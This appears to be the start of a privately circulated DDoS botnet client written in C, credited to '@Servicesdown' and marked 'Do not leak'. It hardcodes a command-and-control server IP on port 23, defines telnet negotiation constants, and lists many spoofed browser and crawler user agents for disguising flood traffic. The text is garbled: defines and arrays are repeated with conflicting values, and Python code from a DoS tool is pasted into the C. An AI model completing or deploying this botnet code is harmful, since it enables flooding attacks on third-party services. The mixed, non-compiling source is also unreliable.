//Priavte Client Side By @Servicesdown
// Client Profits.c 
// Do not leak 
// Build-1

                                                                      
//88888888ba                              ad88  88                      
//88      "8b                            d8"    ""    ,d                
//88      ,8P                            88           88                
//88aaaaaa8P'  8b,dPPYba,   ,adPPYba,  MM88MMM  88  MM88MMM  ,adPPYba,  
//88""""""'    88P'   "Y8  a8"     "8a   88     88    88     I8[    ""  
//88           88          8b       d8   88     88    88      `"Y8ba,   
//88           88          "8a,   ,a8"   88     88    88,    aa    ]8I  
//88           88           `"YbbdP"'    88     88    "Y888  `"YbbdP"'  
//######################################################################

#define PR_SET_NAME 15
#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254
#define OPT_SGA   3
#define STD2_STRING "dts"
#define STD2_SIZE 65
#define BUFFER_SIZE 1024
#define PR_SET_NAME 15
#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254
#define OPT_SGA   3
#define STD2_SIZE 55
#define BUFFER_SIZE 512

#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <pthread.h>


unsigned char *commServer[] =
{
	"107.172.41.207:23"
};

char *useragents[] = {
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
        "Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
        "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
        "Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
};
char *useragents[] ={
	"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)",
	"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
	"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
	"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
	"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36",
	"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",
	"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00",
	"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)",
	"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
	"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)",
	"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
	"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)",
	"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0"
};

char *useragents[] = {
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
        "Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
        "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
        "Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
};

# generates a user agent array
def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0 IceDragon/26.0.0.2')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0 IceDragon/26.0.0.2')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('agadine/1.x.x (+http://www.agada.de)')
	headers_useragents.append('Agent-SharewarePlazaFileCheckBot/2.0+(+http://www.SharewarePlaza.com)')
	headers_useragents.append('AgentName/0.1 libwww-perl/5.48')
	headers_useragents.append('AIBOT/2.1 By +(www.21seek.com A Real artificial intelligence search engine China)')
	headers_useragents.append('AideRSS/1.0 (aiderss.com)')
	headers_useragents.append('aipbot/1.0 (aipbot; http://www.aipbot.com; aipbot@aipbot.com)')
	headers_useragents.append('aipbot/2-beta (aipbot dev; http://aipbot.com; aipbot@aipbot.com)')
	headers_useragents.append('Akregator/1.2.9; librss/remnants')
	headers_useragents.append('Aladin/3.324')
	headers_useragents.append('Alcatel-BG3/1.0 UP.Browser/5.0.3.1.2')
	headers_useragents.append('Aleksika Spider/1.0 (+http://www.aleksika.com/)')
	headers_useragents.append('AlertInfo 2.0 (Powered by Newsbrain)')
	headers_useragents.append('AlkalineBOT/1.3')
	headers_useragents.append('AlkalineBOT/1.4 (1.4.0326.0 RTM)')
	headers_useragents.append('Allesklar/0.1 libwww-perl/5.46')
	headers_useragents.append('Alligator 1.31 (www.nearsoftware.com)')
	headers_useragents.append('Allrati/1.1 (+)')
	headers_useragents.append('AltaVista Intranet V2.0 AVS EVAL search@freeit.com')
	headers_useragents.append('AltaVista Intranet V2.0 Compaq Altavista Eval sveand@altavista.net')
	headers_useragents.append('AltaVista Intranet V2.0 evreka.com crawler@evreka.com')
	headers_useragents.append('AltaVista V2.0B crawler@evreka.com')
	headers_useragents.append('amaya/x.xx libwww/x.x.x')
	headers_useragents.append('AmfibiBOT')
	headers_useragents.append('Amfibibot/0.06 (Amfibi Web Search; http://www.amfibi.com; agent@amfibi.com)')
	headers_useragents.append('Amfibibot/0.07 (Amfibi Robot; http://www.amfibi.com; agent@amfibi.com)')
	headers_useragents.append('amibot')
	headers_useragents.append('Amiga-AWeb/3.4.167SE')
	headers_useragents.append('AmigaVoyager/3.4.4 (MorphOS/PPC native)')
	headers_useragents.append('AmiTCP Miami (AmigaOS 2.04)')
	headers_useragents.append('Amoi 8512/R21.0 NF-Browser/3.3')
	headers_useragents.append('amzn_assoc')
	headers_useragents.append('AnnoMille spider 0.1 alpha - http://www.annomille.it')
	headers_useragents.append('annotate_google; http://ponderer.org/download/annotate_google.user.js')
	headers_useragents.append('Anonymized by ProxyOS: http://www.megaproxy.com')
	headers_useragents.append('Anonymizer/1.1')
	headers_useragents.append('AnswerBus (http://www.answerbus.com/)')
	headers_useragents.append('AnswerChase PROve x.0')
	headers_useragents.append('AnswerChase x.0')
	headers_useragents.append('ANTFresco/x.xx')
	headers_useragents.append('antibot-V1.1.5/i586-linux-2.2')
	headers_useragents.append('AnzwersCrawl/2.0 (anzwerscrawl@anzwers.com.au;Engine)')
	headers_useragents.append('Apexoo Spider 1.x')
	headers_useragents.append('Aplix HTTP/1.0.1')
	headers_useragents.append('Aplix_SANYO_browser/1.x (Japanese)')
	headers_useragents.append('Aplix_SEGASATURN_browser/1.x (Japanese)')
	headers_useragents.append('Aport')
	headers_useragents.append('appie 1.1 (www.walhello.com)')

	headers_useragents.append('agadine/1.x.x (+http://www.agada.de)')
	headers_useragents.append('Agent-SharewarePlazaFileCheckBot/2.0+(+http://www.SharewarePlaza.com)')
	headers_useragents.append('AgentName/0.1 libwww-perl/5.48')
	headers_useragents.append('AIBOT/2.1 By +(www.21seek.com A Real artificial intelligence search engine China)')
	headers_useragents.append('AideRSS/1.0 (aiderss.com)')
	headers_useragents.append('aipbot/1.0 (aipbot; http://www.aipbot.com; aipbot@aipbot.com)')
	headers_useragents.append('aipbot/2-beta (aipbot dev; http://aipbot.com; aipbot@aipbot.com)')
	headers_useragents.append('Akregator/1.2.9; librss/remnants')
	headers_useragents.append('Aladin/3.324')
	headers_useragents.append('Alcatel-BG3/1.0 UP.Browser/5.0.3.1.2')
	headers_useragents.append('Aleksika Spider/1.0 (+http://www.aleksika.com/)')
	headers_useragents.append('AlertInfo 2.0 (Powered by Newsbrain)')
	headers_useragents.append('AlkalineBOT/1.3')
	headers_useragents.append('AlkalineBOT/1.4 (1.4.0326.0 RTM)')
	headers_useragents.append('Allesklar/0.1 libwww-perl/5.46')
	headers_useragents.append('Alligator 1.31 (www.nearsoftware.com)')
	headers_useragents.append('Allrati/1.1 (+)')
	headers_useragents.append('AltaVista Intranet V2.0 AVS EVAL search@freeit.com')
	headers_useragents.append('AltaVista Intranet V2.0 Compaq Altavista Eval sveand@altavista.net')
	headers_useragents.append('AltaVista Intranet V2.0 evreka.com crawler@evreka.com')
	headers_useragents.append('AltaVista V2.0B crawler@evreka.com')
	headers_useragents.append('amaya/x.xx libwww/x.x.x')
	headers_useragents.append('AmfibiBOT')
	headers_useragents.append('Amfibibot/0.06 (Amfibi Web Search; http://www.amfibi.com; agent@amfibi.com)')
	headers_useragents.append('Amfibibot/0.07 (Amfibi Robot; http://www.amfibi.com; agent@amfibi.com)')
	headers_useragents.append('amibot')
	headers_useragents.append('Amiga-AWeb/3.4.167SE')
	headers_useragents.append('AmigaVoyager/3.4.4 (MorphOS/PPC native)')
	headers_useragents.append('AmiTCP Miami (AmigaOS 2.04)')
	headers_useragents.append('Amoi 8512/R21.0 NF-Browser/3.3')
	headers_useragents.append('amzn_assoc')
	headers_useragents.append('AnnoMille spider 0.1 alpha - http://www.annomille.it')
	headers_useragents.append('annotate_google; http://ponderer.org/download/annotate_google.user.js')
	headers_useragents.append('Anonymized by ProxyOS: http://www.megaproxy.com')
	headers_useragents.append('Anonymizer/1.1')
	headers_useragents.append('AnswerBus (http://www.answerbus.com/)')
	headers_useragents.append('AnswerChase PROve x.0')
	headers_useragents.append('AnswerChase x.0')
	headers_useragents.append('ANTFresco/x.xx')
	headers_useragents.append('antibot-V1.1.5/i586-linux-2.2')
	headers_useragents.append('AnzwersCrawl/2.0 (anzwerscrawl@anzwers.com.au;Engine)')
	headers_useragents.append('Apexoo Spider 1.x')
	headers_useragents.append('Aplix HTTP/1.0.1')
	headers_useragents.append('Aplix_SANYO_browser/1.x (Japanese)')
	headers_useragents.append('Aplix_SEGASATURN_browser/1.x (Japanese)')
	headers_useragents.append('Aport')
	headers_useragents.append('appie 1.1 (www.walhello.com)')
	headers_useragents.append('Apple iPhone v1.1.4 CoreMedia v1.0.0.4A102')
	headers_useragents.append('Apple-PubSub/65.1.1')
	headers_useragents.append('ArabyBot (compatible; Mozilla/5.0; GoogleBot; FAST Crawler 6.4; http://www.araby.com;)')
	headers_useragents.append('ArachBot')
	headers_useragents.append('Arachnoidea (arachnoidea@euroseek.com)')
	headers_useragents.append('aranhabot')
	headers_useragents.append('ArchitextSpider')
	headers_useragents.append('archive.org_bot')
	headers_useragents.append('Argus/1.1 (Nutch; http://www.simpy.com/bot.html; feedback at simpy dot com)')
	headers_useragents.append('Arikus_Spider')
	headers_useragents.append('Arquivo-web-crawler (compatible; heritrix/1.12.1 +http://arquivo-web.fccn.pt)')
	headers_useragents.append('ASAHA Search Engine Turkey V.001 (http://www.asaha.com/)')
	headers_useragents.append('Asahina-Antenna/1.x')
	headers_useragents.append('Asahina-Antenna/1.x (libhina.pl/x.x ; libtime.pl/x.x)')
	headers_useragents.append('ask.24x.info')
	headers_useragents.append('AskAboutOil/0.06-rcp (Nutch; http://www.nutch.org/docs/en/bot.html; nutch-agent@askaboutoil.com)')
	headers_useragents.append('asked/Nutch-0.8 (web crawler; http://asked.jp; epicurus at gmail dot com)')
	headers_useragents.append('ASPSeek/1.2.5')
	headers_useragents.append('ASPseek/1.2.9d')
	headers_useragents.append('ASPSeek/1.2.x')
	headers_useragents.append('ASPSeek/1.2.xa')
	headers_useragents.append('ASPseek/1.2.xx')
	headers_useragents.append('ASPSeek/1.2.xxpre')
	headers_useragents.append('ASSORT/0.10')
	headers_useragents.append('asterias/2.0')
	headers_useragents.append('AtlocalBot/1.1 +(http://www.atlocal.com/local-web-site-owner.html)')
	headers_useragents.append('Atomic_Email_Hunter/4.0')
	headers_useragents.append('Atomz/1.0')
	headers_useragents.append('atSpider/1.0')

	headers_useragents.append('Attentio/Nutch-0.9-dev (Attentios beta blog crawler; www.attentio.com; info@attentio.com)')
	headers_useragents.append('AU-MIC/2.0 MMP/2.0')
	headers_useragents.append('AUDIOVOX-SMT5600')
	headers_useragents.append('augurfind')
	headers_useragents.append('augurnfind V-1.x')
	headers_useragents.append('autoemailspider')
	headers_useragents.append('autohttp')
	headers_useragents.append('autowebdir 1.1 (www.autowebdir.com)')
	headers_useragents.append('AV Fetch 1.0')
	headers_useragents.append('Avant Browser (http://www.avantbrowser.com)')
	headers_useragents.append('AVSearch-1.0(peter.turney@nrc.ca)')
	headers_useragents.append('AVSearch-2.0-fusionIdx-14-CompetitorWebSites')
	headers_useragents.append('AVSearch-3.0(AltaVista/AVC)')
	headers_useragents.append('AWeb')
	headers_useragents.append('axadine/ (Axadine Crawler; http://www.axada.de/; )')
	headers_useragents.append('AxmoRobot - Crawling your site for better indexing on www.axmo.com search engine.')
	headers_useragents.append('Azureus 2.x.x.x')
	headers_useragents.append('BabalooSpider/1.3 (BabalooSpider; http://www.babaloo.si; spider@babaloo.si)')
	headers_useragents.append('BaboomBot/1.x.x (+http://www.baboom.us)')
	headers_useragents.append('BackStreet Browser 3.x')
	headers_useragents.append('BaiduImagespider+(+http://www.baidu.jp/search/s308.html)')
	headers_useragents.append('BaiDuSpider')
	headers_useragents.append('Baiduspider+(+http://help.baidu.jp/system/05.html)')
	headers_useragents.append('Baiduspider+(+http://www.baidu.com/search/spider.htm)')
	headers_useragents.append('Baiduspider+(+http://www.baidu.com/search/spider_jp.html)')
	headers_useragents.append('Balihoo/Nutch-1.0-dev (Crawler for Balihoo.com search engine - obeys robots.txt and robots meta tags ; http://balihoo.com/index.aspx; robot at balihoo dot com)')
	headers_useragents.append('BanBots/1.2 (spider@banbots.com)')
	headers_useragents.append('Barca/2.0.xxxx')
        headers_useragents.append('(DreamPassport/3.0; isao/MyDiGiRabi)')
	headers_useragents.append('(Privoxy/1.0)')
	headers_useragents.append('*/Nutch-0.9-dev')
	headers_useragents.append('+SitiDi.net/SitiDiBot/1.0 (+Have Good Day)')
	headers_useragents.append('-DIE-KRAEHE- META-SEARCH-ENGINE/1.1 http://www.die-kraehe.de')
	headers_useragents.append('123spider-Bot (Version: 1.02) powered by www.123spider.de')
	headers_useragents.append('192.comAgent')
	headers_useragents.append('1st ZipCommander (Net) - http://www.zipcommander.com/')
	headers_useragents.append('2Bone_LinkChecker/1.0 libwww-perl/5.64')
	headers_useragents.append('4anything.com LinkChecker v2.0')
	headers_useragents.append('8484 Boston Project v 1.0')
	headers_useragents.append(':robot/1.0 (linux) ( admin e-mail: undefined http://www.neofonie.de/loesungen/search/robot.html )')
	headers_useragents.append('A-Online Search')
	headers_useragents.append('A1 Keyword Research/1.0.2 (+http://www.micro-sys.dk/products/keyword-research/) miggibot/2007.03.27')
	headers_useragents.append('A1 Sitemap Generator/1.0 (+http://www.micro-sys.dk/products/sitemap-generator/) miggibot/2006.01.24')
	headers_useragents.append('AbachoBOT')
	headers_useragents.append('AbachoBOT (Mozilla compatible)')
	headers_useragents.append('ABCdatos BotLink/5.xx.xxx#BBL')
	headers_useragents.append('Aberja Checkomat 	Aberja Hybridsuchmaschine (Germany)')
	headers_useragents.append('abot/0.1 (abot; http://www.abot.com; abot@abot.com)')
	headers_useragents.append('About/0.1libwww-perl/5.47')
	headers_useragents.append('Accelatech RSSCrawler/0.4')
	headers_useragents.append('accoona 	Accoona Search robot')
	headers_useragents.append('Accoona-AI-Agent/1.1.1 (crawler at accoona dot com)')
	headers_useragents.append('Accoona-AI-Agent/1.1.2 (aicrawler at accoonabot dot com)')
	headers_useragents.append('Ace Explorer')
	headers_useragents.append('Ack (http://www.ackerm.com/)')
	headers_useragents.append('AcoiRobot')
	headers_useragents.append('Acoon Robot v1.50.001')
	headers_useragents.append('Acoon Robot v1.52 (http://www.acoon.de)')
	headers_useragents.append('Acoon-Robot 4.0.x.[xx] (http://www.acoon.de)')
	headers_useragents.append('Acoon-Robot v3.xx (http://www.acoon.de and http://www.acoon.com)')
	headers_useragents.append('Acorn/Nutch-0.9 (Non-Profit Search Engine; acorn.isara.org; acorn at isara dot org)')
	headers_useragents.append('ActiveBookmark 1.x')
	headers_useragents.append('Activeworlds')
	headers_useragents.append('ActiveWorlds/3.xx (xxx)')
	headers_useragents.append('Ad Muncher v4.xx.x')
	headers_useragents.append('Ad Muncher v4x Build xxxxx')
	headers_useragents.append('Adaxas Spider (http://www.adaxas.net/)')
	headers_useragents.append('Advanced Browser (http://www.avantbrowser.com)')
	headers_useragents.append('AESOP_com_SpiderMan')
